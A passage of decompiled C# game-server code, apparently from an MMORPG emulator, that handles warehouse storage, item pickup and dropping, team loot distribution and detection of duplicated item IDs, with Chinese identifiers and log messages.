					else if (BitConverter.ToInt32(物品类2.物品数量, 0) >= 数量)
					{
						byte[] array3 = new byte[World.数据库单个物品大小];
						byte[] array4 = new byte[4];
						byte[] array5 = new byte[8];
						物品类 物品类3 = 得到人物物品类型(BitConverter.ToInt32(物品类2.物品ID, 0), 物品类2.FLD_MAGIC0);
						byte[] src;
						if (物品类3 != null)
						{
							if (BitConverter.ToInt32(物品类2.物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品类2.物品ID, 0) == 1008000045)
							{
								src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
								BitConverter.GetBytes(数量);
								Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
							}
							else
							{
								src = 物品类3.物品全局ID;
								包位置 = 物品类3.物品位置;
								Buffer.BlockCopy(BitConverter.GetBytes(数量 + BitConverter.ToInt32(物品类3.物品数量, 0)), 0, array3, 12, 4);
							}
						}
						else
						{
							BitConverter.GetBytes(数量);
							src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
						}
						Buffer.BlockCopy(src, 0, array3, 0, 8);
						Buffer.BlockCopy(物品类2.物品ID, 0, array3, 8, 4);
						Buffer.BlockCopy(物品类2.物品属性, 0, array3, 16, World.物品属性大小);
						Buffer.BlockCopy(物品类2.物品_byte, 72, array3, 72, 1);
						if (物品类2.物品单个重量 * 数量 + base.人物当前负重 >= base.总负重)
						{
							购买物品提示(11);
							return;
						}
						装备栏包裹[包位置].物品_byte = array3;
						int num3 = BitConverter.ToInt32(物品类2.物品数量, 0) - (int)数量;
						仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[包位置], 包位置, 费用);
						switch (仓库类型)
						{
						case 8:
							if (num3 <= 0)
							{
								仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 灵兽仓库[位置], 位置, 费用);
								灵兽仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							}
							else
							{
								灵兽仓库[位置].物品数量 = BitConverter.GetBytes(num3);
								仓库包物品操作(38144, 仓库类型, 物品ID, num3, 灵兽仓库[位置], 位置, 费用);
							}
							break;
						case 10:
							if (num3 <= 0)
							{
								仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 灵宠仓库[位置], 位置, 费用);
								灵宠仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							}
							else
							{
								灵宠仓库[位置].物品数量 = BitConverter.GetBytes(num3);
								仓库包物品操作(38144, 仓库类型, 物品ID, num3, 灵宠仓库[位置], 位置, 费用);
							}
							break;
						case 5:
							if (num3 <= 0)
							{
								仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 个人仓库[位置], 位置, 费用);
								个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							}
							else
							{
								个人仓库[位置].物品数量 = BitConverter.GetBytes(num3);
								仓库包物品操作(38144, 仓库类型, 物品ID, num3, 个人仓库[位置], 位置, 费用);
							}
							break;
						default:
							if (num3 <= 0)
							{
								仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 公共仓库[位置], 位置, 费用);
								公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							}
							else
							{
								公共仓库[位置].物品数量 = BitConverter.GetBytes(num3);
								仓库包物品操作(38144, 仓库类型, 物品ID, num3, 公共仓库[位置], 位置, 费用);
							}
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "仓库_装备栏加物品 出错 [" + base.Userid + "][" + base.UserName + "]位置[" + 位置 + "]数量[" + 数量 + "]包位置[" + 包位置 + "]仓库类型[" + 仓库类型 + "] " + ex.Message);
			}
			更新金钱和负重();
		}

		public void 仓库_装备栏减物品(int 物品ID, int 位置, long 数量, int 仓库位置, int 仓库类型)
		{
			int num = 0;
			int num2 = 0;
			try
			{
				if (物品ID == 2000000000)
				{
					if (base.Player_Money < 数量)
					{
						MainForm.WriteLine(6, "非法复制_仓库存取_放东西到仓库1[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
						return;
					}
					base.Player_Money -= 数量;
					if (仓库类型 == 3)
					{
						base.个人仓库钱数 += 数量;
						仓库_装备栏加减钱数(物品ID, base.个人仓库钱数, 149, 仓库类型);
					}
					else
					{
						base.综合仓库钱数 += 数量;
						仓库_装备栏加减钱数(物品ID, base.综合仓库钱数, 149, 仓库类型);
					}
				}
				else
				{
					if (数量 < 1 || 装备栏包裹[位置].锁定)
					{
						return;
					}
					物品类 物品类2 = 装备栏包裹[位置];
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类2.物品ID, 0), out var value))
					{
						return;
					}
					if (GM模式 != 8 && value.FLD_LOCK == 1)
					{
						系统提示("[百宝阁]锁定的物品无法保存到仓库。");
						return;
					}
					int fLD_SIDE = value.FLD_SIDE;
					for (int i = 0; i < 96; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) > 0 || BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) != 0)
						{
							num++;
						}
					}
					switch (仓库类型)
					{
					case 7:
					{
						for (int m = 0; m < 2; m++)
						{
							if (BitConverter.ToInt32(灵兽仓库[m].物品数量, 0) > 0 || BitConverter.ToInt32(灵兽仓库[m].物品ID, 0) != 0)
							{
								num2++;
							}
						}
						break;
					}
					case 9:
					{
						for (int k = 0; k < 20; k++)
						{
							if (BitConverter.ToInt32(灵宠仓库[k].物品数量, 0) > 0 || BitConverter.ToInt32(灵宠仓库[k].物品ID, 0) != 0)
							{
								num2++;
							}
						}
						break;
					}
					case 3:
					{
						for (int l = 0; l < 60; l++)
						{
							if (BitConverter.ToInt32(个人仓库[l].物品数量, 0) > 0 || BitConverter.ToInt32(个人仓库[l].物品ID, 0) != 0)
							{
								num2++;
							}
						}
						break;
					}
					default:
					{
						for (int j = 0; j < 60; j++)
						{
							if (BitConverter.ToInt32(公共仓库[j].物品数量, 0) > 0 || BitConverter.ToInt32(公共仓库[j].物品ID, 0) != 0)
							{
								num2++;
							}
						}
						break;
					}
					}
					if (fLD_SIDE == 0)
					{
						if (数量 > 1)
						{
							MainForm.WriteLine(6, "非法复制_仓库存取_放东西到仓库3[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "] 物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + 数量 + "]");
							减去物品(位置, BitConverter.ToInt32(物品类2.物品数量, 0));
							return;
						}
						if (BitConverter.ToInt32(物品类2.物品数量, 0) == 数量)
						{
							base.人物当前负重 -= 物品类2.物品总重量;
							byte[] array = new byte[World.数据库单个物品大小];
							byte[] array2 = new byte[8];
							byte[] 物品全局ID = 物品类2.物品全局ID;
							Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 12, 4);
							byte[] dst = array;
							Buffer.BlockCopy(物品全局ID, 0, dst, 0, 8);
							Buffer.BlockCopy(物品类2.物品ID, 0, array, 8, 4);
							Buffer.BlockCopy(物品类2.物品属性, 0, array, 16, World.物品属性大小);
							Buffer.BlockCopy(物品类2.物品_byte, 72, array, 72, 1);
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
							switch (仓库类型)
							{
							case 7:
								灵兽仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 灵兽仓库[仓库位置], 仓库位置, 0);
								break;
							case 9:
								灵宠仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 灵宠仓库[仓库位置], 仓库位置, 0);
								break;
							case 3:
								个人仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 个人仓库[仓库位置], 仓库位置, 0);
								break;
							default:
								公共仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 公共仓库[仓库位置], 仓库位置, 0);
								break;
							}
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							减去物品(位置, BitConverter.ToInt32(物品类2.物品数量, 0));
						}
					}
					else
					{
						if (BitConverter.ToInt32(物品类2.物品数量, 0) < 数量)
						{
							MainForm.WriteLine(6, "非法复制_仓库存取_放东西到仓库2[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "] 物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + 数量 + "]");
							return;
						}
						int num3 = BitConverter.ToInt32(物品类2.物品数量, 0) - (int)数量;
						base.人物当前负重 -= 物品类2.物品总重量;
						byte[] array3 = new byte[World.数据库单个物品大小];
						byte[] array4 = new byte[4];
						byte[] array5 = new byte[8];
						物品类 物品类3 = 得到人物公共仓库类型(BitConverter.ToInt32(物品类2.物品ID, 0), 仓库类型, 物品类2.FLD_MAGIC0);
						byte[] src;
						if (物品类3 != null)
						{
							if (BitConverter.ToInt32(物品类2.物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品类2.物品ID, 0) == 1008000045)
							{
								src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
								BitConverter.GetBytes(数量);
								Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
							}
							else
							{
								src = 物品类3.物品全局ID;
								仓库位置 = 物品类3.物品位置;
								Buffer.BlockCopy(BitConverter.GetBytes(数量 + BitConverter.ToInt32(物品类3.物品数量, 0)), 0, array3, 12, 4);
							}
						}
						else
						{
							BitConverter.GetBytes(数量);
							src = ((num3 > 0) ? BitConverter.GetBytes(RxjhClass.GetDBItmeId()) : 物品类2.物品全局ID);
							Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
						}
						Buffer.BlockCopy(src, 0, array3, 0, 8);
						Buffer.BlockCopy(物品类2.物品ID, 0, array3, 8, 4);
						Buffer.BlockCopy(物品类2.物品属性, 0, array3, 16, World.物品属性大小);
						Buffer.BlockCopy(物品类2.物品_byte, 72, array3, 72, 1);
						if (num3 <= 0)
						{
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
						}
						else
						{
							装备栏包裹[位置].物品数量 = BitConverter.GetBytes(num3);
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
						}
						switch (仓库类型)
						{
						case 7:
							灵兽仓库[仓库位置].物品_byte = array3;
							仓库包物品操作(38144, 仓库类型, 物品ID, 灵兽仓库[仓库位置].Get物品数量, 灵兽仓库[仓库位置], 仓库位置, 0);
							break;
						case 9:
							灵宠仓库[仓库位置].物品_byte = array3;
							仓库包物品操作(38144, 仓库类型, 物品ID, 灵宠仓库[仓库位置].Get物品数量, 灵宠仓库[仓库位置], 仓库位置, 0);
							break;
						case 3:
							个人仓库[仓库位置].物品_byte = array3;
							仓库包物品操作(38144, 仓库类型, 物品ID, 个人仓库[仓库位置].Get物品数量, 个人仓库[仓库位置], 仓库位置, 0);
							break;
						default:
							公共仓库[仓库位置].物品_byte = array3;
							仓库包物品操作(38144, 仓库类型, 物品ID, 公共仓库[仓库位置].Get物品数量, 公共仓库[仓库位置], 仓库位置, 0);
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "仓库_装备栏减物品 出错 [" + base.Userid + "][" + base.UserName + "]位置[" + 位置 + "]数量[" + 数量 + "]仓库位置[" + 仓库位置 + "]仓库类型[" + 仓库类型 + "] " + ex.Message);
			}
			更新金钱和负重();
		}

		public void 打开个人仓库()
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write4(5);
				发包类.Write4(5);
				发包类.Write4(8);
				for (int i = 0; i < 60; i++)
				{
					if (BitConverter.ToInt32(个人仓库[i].物品数量, 0) == 0)
					{
						个人仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("个人仓库", ref 个人仓库[i]);
					}
					if (个人仓库[i].FLD_FJ_中级附魂 <= 22 && 个人仓库[i].FLD_FJ_中级附魂 >= 21 && 个人仓库[i].FLD_FJ_觉醒 > 0)
					{
						个人仓库[i].物品_中级附魂_追加_觉醒 = 个人仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(个人仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(base.个人仓库钱数);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 38400, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开个人仓库出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 打开综合仓库()
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write4(5);
				发包类.Write4(5);
				发包类.Write4(9);
				for (int i = 0; i < 60; i++)
				{
					if (BitConverter.ToInt32(公共仓库[i].物品数量, 0) == 0)
					{
						公共仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("公共仓库", ref 公共仓库[i]);
					}
					if (公共仓库[i].FLD_FJ_中级附魂 <= 22 && 公共仓库[i].FLD_FJ_中级附魂 >= 21 && 公共仓库[i].FLD_FJ_觉醒 > 0)
					{
						公共仓库[i].物品_中级附魂_追加_觉醒 = 公共仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(公共仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(base.综合仓库钱数);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 38400, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开综合仓库出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 打开灵宠仓库()
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write2(0);
				发包类.Write4(241);
				发包类.Write4(180);
				for (int i = 0; i < 20; i++)
				{
					if (i >= 20)
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
						continue;
					}
					if (BitConverter.ToInt32(灵宠仓库[i].物品数量, 0) == 0)
					{
						灵宠仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("灵宠仓库", ref 灵宠仓库[i]);
					}
					if (灵宠仓库[i].FLD_FJ_中级附魂 <= 22 && 灵宠仓库[i].FLD_FJ_中级附魂 >= 21 && 灵宠仓库[i].FLD_FJ_觉醒 > 0)
					{
						灵宠仓库[i].物品_中级附魂_追加_觉醒 = 灵宠仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(灵宠仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(0L);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 32771, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开灵宠仓库出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 打开灵兽仓库()
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write2(28);
				发包类.Write2(0);
				发包类.Write4(28);
				发包类.Write4(61);
				for (int i = 0; i < 2; i++)
				{
					if (i >= 2)
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
						continue;
					}
					if (BitConverter.ToInt32(灵兽仓库[i].物品数量, 0) == 0)
					{
						灵兽仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("灵兽仓库", ref 灵兽仓库[i]);
					}
					if (灵兽仓库[i].FLD_FJ_中级附魂 <= 22 && 灵兽仓库[i].FLD_FJ_中级附魂 >= 21 && 灵兽仓库[i].FLD_FJ_觉醒 > 0)
					{
						灵兽仓库[i].物品_中级附魂_追加_觉醒 = 灵兽仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(灵兽仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(0L);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 40192, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开灵宠仓库出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public Players 组队分配(Players play)
		{
			int i = 0;
			try
			{
				if (World.Teams.TryGetValue(play.组队id, out var value))
				{
					if (value.道具分配规则 == 2)
					{
						for (; i < 3; i++)
						{
							int key = new Random().Next(0, value.组队列表.Count);
							Players players = value.得到对应队员(key);
							if (players != null && play.查找范围玩家(1000, players))
							{
								return players;
							}
						}
					}
					else
					{
						for (; i < 3; i++)
						{
							if (value.当前分配 >= value.组队列表.Count)
							{
								value.当前分配 = 0;
							}
							Players players2 = value.得到对应队员(value.当前分配);
							value.当前分配++;
							if (players2 != null && play.查找范围玩家(1000, players2))
							{
								return players2;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(100, "组队分配出错 [" + play.UserName + "] 循环次数[" + i + "]" + ex);
				return null;
			}
			return play;
		}

		public void 捡物品(byte[] data, int length)
		{
			封包修改(data, length);
			long num = BitConverter.ToInt64(data, 10);
			if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || 进店中)
			{
				捡物品提示(5, num);
				return;
			}
			for (int i = 0; i < 96; i++)
			{
				long num2 = BitConverter.ToInt64(装备栏包裹[i].物品全局ID, 0);
				if (num2 != 0L && num2 == num)
				{
					捡物品提示(5, num);
					return;
				}
			}
			try
			{
				using (new Lock(World.locklist2, "拾取"))
				{
					地面物品类 itme = 地面物品类.GetItme(num);
					Players players;
					if (itme != null)
					{
						bool flag = false;
						players = this;
						if (itme.物品优先权 == null || itme.物品优先权 == this)
						{
							goto IL_042f;
						}
						if (组队id == 0)
						{
							捡物品提示(5, num);
							return;
						}
						if (!World.Teams.TryGetValue(组队id, out var value))
						{
							捡物品提示(5, num);
							return;
						}
						foreach (Players value3 in value.组队列表.Values)
						{
							if (value3 == itme.物品优先权)
							{
								flag = true;
							}
						}
						if (flag)
						{
							goto IL_042f;
						}
						捡物品提示(5, num);
					}
					else
					{
						捡物品提示(5, num);
					}
					goto end_IL_00bd;
					IL_01be:
					if (itme.物品.物品总重量 + players.人物当前负重 >= players.总负重)
					{
						players.捡物品提示(2, num);
						return;
					}
					int num3 = 得到包裹空位(players);
					if (num3 != -1)
					{
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(itme.物品.物品ID, 0), out var value2))
						{
							return;
						}
						int fLD_SIDE = value2.FLD_SIDE;
						byte[] 物品数量 = itme.物品.物品数量;
						if (fLD_SIDE != 0)
						{
							物品类 物品类2 = players.得到人物物品类型(BitConverter.ToInt32(itme.物品.物品ID, 0), itme.物品.FLD_MAGIC0);
							if (物品类2 != null)
							{
								num3 = 物品类2.物品位置;
								物品数量 = BitConverter.GetBytes(BitConverter.ToInt32(itme.物品.物品数量, 0) + BitConverter.ToInt32(物品类2.物品数量, 0));
							}
						}
						if (!World.ItemTemp.ContainsKey(num))
						{
							return;
						}
						World.ItemTemp.Remove(num);
						if (base.是否假人 == 0)
						{
							if (itme.怪物PID > 0 && itme.开启公告 == 1 && World.是否开启公告掉落提示 == 1)
							{
								玩家从怪物身上获得物品(base.UserName, base.人物坐标_地图, itme.怪物PID, (int)itme.物品.Get物品ID);
							}
							RxjhClass.掉落记录(players.Userid, players.UserName, itme.物品.Get物品全局ID, (int)itme.物品.Get物品ID, itme.物品.得到物品名称(), itme.物品.FLD_MAGIC0, itme.物品.FLD_MAGIC1, itme.物品.FLD_MAGIC2, itme.物品.FLD_MAGIC3, itme.物品.FLD_MAGIC4, players.人物坐标_地图, (int)players.人物坐标_X, (int)players.人物坐标_Y, "掉落");
						}
						players.捡得到物品(num3, 物品数量, itme.物品.物品全局ID, itme.物品.物品ID, itme.物品.物品属性);
						itme.npcydtheout();
						players.更新金钱和负重();
						return;
					}
					捡物品提示(7, num);
					goto end_IL_00bd;
					IL_042f:
					if (组队id == 0)
					{
						goto IL_01be;
					}
					players = 组队分配(this);
					if (players != null)
					{
						goto IL_01be;
					}
					捡物品提示(5, num);
					end_IL_00bd:;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "捡物品出错 [" + base.Userid + "][" + base.UserName + "] ID[" + num + "] " + ex.Message);
			}
		}

		public void 检查背包复制(Players play)
		{
			ConcurrentDictionary<long, 物品类> concurrentDictionary = new ConcurrentDictionary<long, 物品类>();
			for (int i = 0; i < 96; i++)
			{
				if (concurrentDictionary.TryGetValue(BitConverter.ToInt64(play.装备栏包裹[i].物品全局ID, 0), out var value))
				{
					play.减去物品(i, value.Get物品数量);
				}
				else
				{
					concurrentDictionary.TryAdd(BitConverter.ToInt64(play.装备栏包裹[i].物品全局ID, 0), play.装备栏包裹[i]);
				}
			}
			concurrentDictionary.Clear();
			在线检查装备复制(play);
		}

		public bool 在线检查装备复制(Players player)
		{
			bool flag = false;
			try
			{
				long num = 0L;
				for (int i = 0; i < 17; i++)
				{
					if (player.装备栏已穿装备[i].Get物品全局ID == 0)
					{
						continue;
					}
					num = player.装备栏已穿装备[i].Get物品全局ID;
					for (int j = i + 1; j < 17; j++)
					{
						if (num == player.装备栏已穿装备[j].Get物品全局ID)
						{
							MainForm.WriteLine(77, "身上物品全局物品ID重复已删除[" + player.装备栏已穿装备[j].得到物品名称() + "][" + BitConverter.ToInt64(player.装备栏已穿装备[j].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.装备栏已穿装备[j].物品_byte = new byte[World.数据库单个物品大小];
							if (!flag)
							{
								flag = true;
							}
						}
					}
				}
				long num2 = 0L;
				long num3 = 0L;
				for (int k = 0; k < 60; k++)
				{
					if (player.个人仓库[k].Get物品全局ID != 0)
					{
						num2 = player.个人仓库[k].Get物品全局ID;
						for (int l = k + 1; l < 60; l++)
						{
							if (num2 == player.个人仓库[l].Get物品全局ID)
							{
								MainForm.WriteLine(77, "个人仓库全局ID重复已删除[" + player.个人仓库[l].得到物品名称() + "][" + BitConverter.ToInt64(player.个人仓库[l].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
								player.个人仓库[l].物品_byte = new byte[World.数据库单个物品大小];
								if (!flag)
								{
									flag = true;
								}
							}
						}
						for (int m = 0; m < 60; m++)
						{
							if (num2 == player.公共仓库[m].Get物品全局ID)
							{
								MainForm.WriteLine(77, "综合仓库全局ID重复已删除[" + player.公共仓库[m].得到物品名称() + "][" + BitConverter.ToInt64(player.公共仓库[m].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
								player.公共仓库[m].物品_byte = new byte[World.数据库单个物品大小];
								if (!flag)
								{
									flag = true;
								}
							}
						}
					}
					if (player.公共仓库[k].Get物品全局ID == 0)
					{
						continue;
					}
					num3 = player.公共仓库[k].Get物品全局ID;
					for (int n = k + 1; n < 60; n++)
					{
						if (num3 == player.公共仓库[n].Get物品全局ID)
						{
							player.公共仓库[n].物品_byte = new byte[World.数据库单个物品大小];
							MainForm.WriteLine(77, "综合仓库全局ID重复已删除-1[" + player.公共仓库[n].得到物品名称() + "][" + BitConverter.ToInt64(player.公共仓库[n].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							if (!flag)
							{
								flag = true;
							}
						}
					}
					for (int num4 = 0; num4 < 60; num4++)
					{
						if (num3 == player.个人仓库[num4].Get物品全局ID)
						{
							MainForm.WriteLine(77, "个仓库全局ID重复已删除-1[" + player.公共仓库[num4].得到物品名称() + "][" + BitConverter.ToInt64(player.公共仓库[num4].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.个人仓库[num4].物品_byte = new byte[World.数据库单个物品大小];
							if (!flag)
							{
								flag = true;
							}
						}
					}
				}
				long num5 = 0L;
				for (int num6 = 0; num6 < 96; num6++)
				{
					if (player.装备栏包裹[num6].Get物品全局ID == 0)
					{
						continue;
					}
					num5 = player.装备栏包裹[num6].Get物品全局ID;
					for (int num7 = num6 + 1; num7 < 96; num7++)
					{
						if (num5 == player.装备栏包裹[num7].Get物品全局ID)
						{
							MainForm.WriteLine(77, "包裹全局ID重复已删除[" + player.装备栏包裹[num7].得到物品名称() + "][" + BitConverter.ToInt64(player.装备栏包裹[num7].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.装备栏包裹[num7].物品_byte = new byte[World.数据库单个物品大小];
							if (!flag)
							{
								flag = true;
							}
						}
					}
					for (int num8 = 0; num8 < 17; num8++)
					{
						if (player.装备栏已穿装备[num8].Get物品全局ID == num5)
						{
							MainForm.WriteLine(77, "穿装备身上的全局ID重复已删除-2[" + player.装备栏已穿装备[num8].得到物品名称() + "][" + BitConverter.ToInt64(player.装备栏已穿装备[num8].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.装备栏已穿装备[num8].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
					for (int num9 = 0; num9 < 60; num9++)
					{
						if (num5 == player.个人仓库[num9].Get物品全局ID)
						{
							MainForm.WriteLine(77, "个人仓库全局ID重复已删除-2[" + player.个人仓库[num9].得到物品名称() + "][" + BitConverter.ToInt64(player.个人仓库[num9].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.个人仓库[num9].物品_byte = new byte[World.数据库单个物品大小];
						}
						if (num5 == player.公共仓库[num9].Get物品全局ID)
						{
							MainForm.WriteLine(77, "综合仓库全局ID重复已删除-2[" + player.公共仓库[num9].得到物品名称() + "][" + BitConverter.ToInt64(player.公共仓库[num9].物品全局ID, 0) + "][" + player.Userid + "][" + player.UserName + "]");
							player.公共仓库[num9].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
				}
				if (flag)
				{
					player.初始化装备篮包裹();
					player.初始化已装备物品();
				}
				return flag;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(6, "在线检查装备复制[" + player.Userid + "]-[" + player.UserName + "]" + ex.ToString());
			}
			return flag;
		}

		public void 扔物品(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || 进店中)
				{
					return;
				}
				int num = 封包数据[35];
				int num2 = BitConverter.ToInt32(封包数据, 18);
				int num3 = BitConverter.ToInt32(封包数据, 26);
				if (num3 <= 0 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0 || BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) == 0 || num2 == 2000000000 || !World.Itme.TryGetValue(num2, out var value) || value.FLD_QUESTITEM == 1)
				{
					return;
				}
				if (value.FLD_LOCK == 1)
				{
					系统提示("[百宝阁]锁定的物品无法丢弃。");
					return;
				}
				if (装备栏包裹[num].物品绑定)
				{
					return;
				}
				byte[] array = new byte[World.数据库单个物品大小];
				byte[] array2 = new byte[8];
				Buffer.BlockCopy(装备栏包裹[num].物品_byte, 0, array, 0, World.数据库单个物品大小);
				Buffer.BlockCopy(array, 0, array2, 0, 8);
				if (装备栏包裹[num].物品类型 == 0)
				{
					扔捡物品提示(num, BitConverter.ToInt32(装备栏包裹[num].物品数量, 0));
					减去物品(num, BitConverter.ToInt32(装备栏包裹[num].物品数量, 0));
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 12, 4);
					地面物品类 地面物品类2 = new 地面物品类(array, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图, this, 1);
					if (!World.ItemTemp.TryGetValue(BitConverter.ToInt64(array2, 0), out var value2))
					{
						World.ItemTemp.Add(BitConverter.ToInt64(array2, 0), 地面物品类2);
					}
					if (World.ItemTemp.TryGetValue(BitConverter.ToInt64(array2, 0), out value2))
					{
						地面物品类2.获取范围玩家发送地面增加物品数据包();
					}
				}
				else
				{
					if (BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) <= num3)
					{
						num3 = BitConverter.ToInt32(装备栏包裹[num].物品数量, 0);
					}
					else
					{
						array2 = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						Buffer.BlockCopy(array2, 0, array, 0, 8);
					}
					try
					{
						扔捡物品提示(num, num3);
						减去物品(num, num3);
						Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 12, 4);
						地面物品类 地面物品类3 = new 地面物品类(array, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图, this, 1);
						if (!World.ItemTemp.TryGetValue(BitConverter.ToInt64(array2, 0), out var value3))
						{
							World.ItemTemp.Add(BitConverter.ToInt64(array2, 0), 地面物品类3);
						}
						if (World.ItemTemp.TryGetValue(BitConverter.ToInt64(array2, 0), out value3))
						{
							地面物品类3.获取范围玩家发送地面增加物品数据包();
						}
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(1, "扔物品出错2 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
					}
				}
			}
			catch (Exception ex2)
			{
				MainForm.WriteLine(1, "扔物品出错3 [" + base.Userid + "][" + base.UserName + "] " + ex2.Message);
			}
			更新金钱和负重();
		}

		public void 任务提示(int 任务ID, int 操作ID, int 任务阶段ID)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write2(任务ID);
			发包类.Write2(操作ID);
			发包类.Write2(任务阶段ID);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 33792, base.人物全服ID);
			}
		}

		public void 扔捡物品提示(int 位置, int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA551E0000000F00100001000000010000001100000001000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 18, 4);
